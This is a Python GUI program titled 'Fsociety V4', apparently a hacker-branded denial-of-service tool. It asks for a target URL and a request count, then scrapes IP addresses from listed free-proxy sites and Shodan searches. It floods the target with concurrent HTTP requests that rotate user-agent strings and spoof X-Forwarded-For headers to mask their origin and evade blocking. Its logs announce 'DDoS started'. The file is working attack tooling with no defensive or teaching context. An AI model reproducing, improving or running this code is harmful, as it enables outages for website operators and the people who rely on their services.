import sys
import requests
import asyncio
import aiohttp
import random
import re
import itertools
import socket
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QComboBox, QMessageBox, QTextEdit, QHBoxLayout, QGroupBox
)
from PyQt5.QtGui import QPixmap, QPalette, QColor
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from io import BytesIO

UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux i645 ) AppleWebKit/601.39 (KHTML, like Gecko) Chrome/52.0.1303.178 Safari/600",
    "Mozilla/5.0 (Windows; U; Windows NT 6.2; x64; en-US) AppleWebKit/603.16 (KHTML, like Gecko) Chrome/49.0.3596.149 Safari/602",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_12_8) AppleWebKit/537.8 (KHTML, like Gecko) Chrome/51.0.3447.202 Safari/533",
    "Mozilla/5.0 (U; Linux x86_64; en-US) AppleWebKit/535.12 (KHTML, like Gecko) Chrome/54.0.2790.274 Safari/601",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 7_5_1) AppleWebKit/534.29 (KHTML, like Gecko) Chrome/54.0.2941.340 Safari/602",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_4_2) AppleWebKit/602.18 (KHTML, like Gecko) Chrome/47.0.1755.159 Safari/600",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_4; like Mac OS X) AppleWebKit/601.29 (KHTML, like Gecko)  Chrome/47.0.1661.149 Mobile Safari/536.4",
    "Mozilla/5.0 (Linux; Android 5.1; SM-G9350T Build/LMY47X) AppleWebKit/602.21 (KHTML, like Gecko)  Chrome/50.0.1176.329 Mobile Safari/535.9",
    "Mozilla/5.0 (Linux; U; Android 6.0.1; HTC One M8 Build/MRA58K) AppleWebKit/600.36 (KHTML, like Gecko)  Chrome/53.0.3363.154 Mobile Safari/537.2",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_8_3) Gecko/20100101 Firefox/50.7",
    "Mozilla/5.0 (U; Linux i671 x86_64) AppleWebKit/535.27 (KHTML, like Gecko) Chrome/54.0.1417.286 Safari/537",
    "Mozilla/5.0 (iPad; CPU iPad OS 9_4_4 like Mac OS X) AppleWebKit/536.12 (KHTML, like Gecko)  Chrome/55.0.1687.155 Mobile Safari/600.8",
    "Mozilla/5.0 (Linux; Android 4.4.1; LG-V510 Build/KOT49I) AppleWebKit/535.28 (KHTML, like Gecko)  Chrome/52.0.2705.296 Mobile Safari/602.9",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/54.0.2084.216 Safari/603.3 Edge/8.91691",
    "Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.0; WOW64; en-US Trident/7.0)",
]

ip_list_urls = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.shodan.io/search?query=brazil",
    "https://www.shodan.io/search?query=germany",
    "https://www.shodan.io/search?query=france",
    "https://www.shodan.io/search?query=USA",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://geonode.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
]

class AttackThread(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, target_url, num_requests, attack_method, duration):
        super().__init__()
        self.target_url = target_url
        self.num_requests = num_requests
        self.attack_method = attack_method
        self.duration = duration

    async def fetch_ip_addresses(self, url):
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url) as response:
                    text = await response.text()
                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                    return ip_addresses
            except Exception as e:
                self.log_signal.emit(f"Error fetching IP list from {url}: {e}")
                return []

    async def get_all_ips(self):
        tasks = [self.fetch_ip_addresses(url) for url in ip_list_urls]
        ip_lists = await asyncio.gather(*tasks)
        all_ips = [ip for sublist in ip_lists for ip in sublist]
        return all_ips

    async def send_request(self, session, ip_address):
        headers = {
            "User-Agent": random.choice(UserAgents),
            "X-Forwarded-For": ip_address
        }
        try:
            async with session.get(self.target_url, headers=headers) as response:
                self.log_signal.emit(f"fsociety@root {self.target_url} from IP: {ip_address} - Status: {response.status}")
        except Exception as e:
            self.log_signal.emit(f"Error sending request from IP: {ip_address} - {e}")

    async def attack(self):
        ip_list = await self.get_all_ips()
        ip_cycle = itertools.cycle(ip_list)
        async with aiohttp.ClientSession() as session:
            tasks = [self.send_request(session, next(ip_cycle)) for _ in range(self.num_requests)]
            await asyncio.gather(*tasks)

    def run(self):
        asyncio.run(self.attack())

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Fsociety V4")
        self.setGeometry(200, 200, 600, 600)
        self.setStyleSheet("QMainWindow { border-radius: 2px; }")
        self.setStyleSheet("background-color: #191919; color: white;")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        layout = QVBoxLayout()

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("background-color:#191919; color: red;")
        layout.addWidget(self.log_output)

        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setStyleSheet("background-color: #191919;")
        layout.addWidget(self.image_label)

        image_url = "https://i.pinimg.com/736x/30/b9/46/30b94658f685ffd183c8c442d2973d30.jpg"
        self.load_image(image_url)

        input_group = QGroupBox("Attack Settings")
        input_layout = QVBoxLayout()

        url_layout = QHBoxLayout()
        self.url_label = QLabel("Target URL:")
        url_layout.addWidget(self.url_label, alignment=Qt.AlignCenter)
        self.url_input = QLineEdit()
        self.url_input.setFixedWidth(300)
        url_layout.addWidget(self.url_input, alignment=Qt.AlignCenter)
        input_layout.addLayout(url_layout)

        method_layout = QHBoxLayout()
        self.method_label = QLabel("Attack Method:")
        method_layout.addWidget(self.method_label, alignment=Qt.AlignCenter)
        self.method_combo = QComboBox()
        self.method_combo.addItems(["HTTP HEAD", "HTTP GET", "HTTP POST"])
        method_layout.addWidget(self.method_combo, alignment=Qt.AlignCenter)
        input_layout.addLayout(method_layout)

        self.threads_label = QLabel("Threads:")
        input_layout.addWidget(self.threads_label, alignment=Qt.AlignCenter)
        self.threads_input = QLineEdit()
        self.threads_input.setFixedWidth(300)
        input_layout.addWidget(self.threads_input, alignment=Qt.AlignCenter)

        self.duration_label = QLabel("Duration (seconds):")
        input_layout.addWidget(self.duration_label, alignment=Qt.AlignCenter)
        self.duration_input = QLineEdit()
        self.duration_input.setFixedWidth(300)
        input_layout.addWidget(self.duration_input, alignment=Qt.AlignCenter)

        button_layout = QHBoxLayout()
        self.start_button = QPushButton("Start Attack")
        self.start_button.setFixedWidth(150)
        self.start_button.clicked.connect(self.start_attack)
        self.start_button.setStyleSheet("background-color: green; color: white;")
        button_layout.addWidget(self.start_button, alignment=Qt.AlignCenter)

        self.stop_button = QPushButton("Stop Attack")
        self.stop_button.setFixedWidth(150)
        self.stop_button.setStyleSheet("background-color: red; color: white;")
        button_layout.addWidget(self.stop_button, alignment=Qt.AlignCenter)

        input_layout.addLayout(button_layout)
        input_group.setLayout(input_layout)
        layout.addWidget(input_group)

        # DNS Lookup Section
        dns_group = QGroupBox("Tools")
        dns_layout = QVBoxLayout()

        tool_layout = QHBoxLayout()
        self.tool_label = QLabel("Tools:")
        tool_layout.addWidget(self.tool_label, alignment=Qt.AlignCenter)
        self.tool_combo = QComboBox()
        self.tool_combo.addItems(["DNS Lookup"])
        tool_layout.addWidget(self.tool_combo, alignment=Qt.AlignCenter)
        dns_layout.addLayout(tool_layout)

        self.dns_input = QLineEdit()
        self.dns_input.setPlaceholderText("Enter domain/IP for tool")
        self.dns_input.setFixedWidth(300)
        dns_layout.addWidget(self.dns_input, alignment=Qt.AlignCenter)

        self.run_button = QPushButton("Run Tool")
        self.run_button.setFixedWidth(150)
        self.run_button.clicked.connect(self.run_tool)
        self.run_button.setStyleSheet("background-color: cyan; color: white;")
        dns_layout.addWidget(self.run_button, alignment=Qt.AlignCenter)

        dns_group.setLayout(dns_layout)
        layout.addWidget(dns_group)

        central_widget.setLayout(layout)

    def log_message(self, message):
        self.log_output.append(message)

    def load_image(self, image_url):
        try:
            response = requests.get(image_url)
            response.raise_for_status()
            pixmap = QPixmap()
            pixmap.loadFromData(BytesIO(response.content).getvalue())
            self.image_label.setPixmap(pixmap.scaled(400, 400, Qt.KeepAspectRatio))
        except Exception as e:
            self.log_message(f"Error loading image: {e}")

    def start_attack(self):
        target_url = self.url_input.text().strip()
        attack_method = self.method_combo.currentText().strip()
        try:
            num_requests = int(self.threads_input.text().strip())
            duration = int(self.duration_input.text().strip())
        except ValueError:
            QMessageBox.critical(self, "Fsociety V4", "Threads and Duration must be integers.")
            return

        if not target_url or num_requests <= 0 or duration <= 0:
            QMessageBox.critical(self, "Fsociety V4", "Please provide a valid URL, number of threads, and duration.")
            return

        self.log_message("DDoS started.")

        self.attack_thread = AttackThread(target_url, num_requests, attack_method, duration)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.start()
        QMessageBox.information(self, "Fsociety V4", "DDoS started! Check logs.")

    def run_tool(self):
        selected_tool = self.tool_combo.currentText().strip()
        domain_ip = self.dns_input.text().strip()

        if selected_tool == "DNS Lookup":
            if domain_ip:
                try:
                    ip_address = socket.gethostbyname(domain_ip)
                    self.log_message(f"DNS Lookup: {domain_ip} -> {ip_address}")
                except socket.gaierror:
                    self.log_message(f"DNS Lookup failed for {domain_ip}")
            else:
                QMessageBox.critical(self, "Fsociety V4", "Please enter a domain or IP address.")

app = QApplication(sys.argv)
window = MainWindow()
window.show()
sys.exit(app.exec_())